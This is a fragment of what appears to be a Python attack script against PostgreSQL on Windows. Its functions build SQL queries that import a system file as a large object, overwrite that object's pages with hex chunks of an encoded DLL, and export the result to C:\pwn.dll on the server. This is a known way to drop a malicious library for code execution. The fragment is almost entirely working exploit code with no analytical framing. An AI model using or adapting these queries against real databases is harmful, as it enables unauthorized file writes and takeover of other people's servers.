...
def create_lo(loid):
    ...
    query = f"SELECT lo_import($$C:\\windows\\win.ini$$, {loid})"
    send(query)

def overwrite_pageno(loid):
    ...
    for i in range(0,int(len(encoded_dll)/4096)):
        ...
        if i == 0:
            query = f"UPDATE PG_LARGEOBJECT SET data=decode($${data_chunk}$$, $$hex$$) where LOID={loid} and pageno={i}"
        else:
            query = f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({loid}, {i}, decode($${data_chunk}$$, $$hex$$))"

        send(query)

def export_object(loid):
    log("[i] exporting LO to the File System (might take a few seconds..)")
    query = f"SELECT lo_export({loid}, $$C:\\pwn.dll$$)"
    send(query)
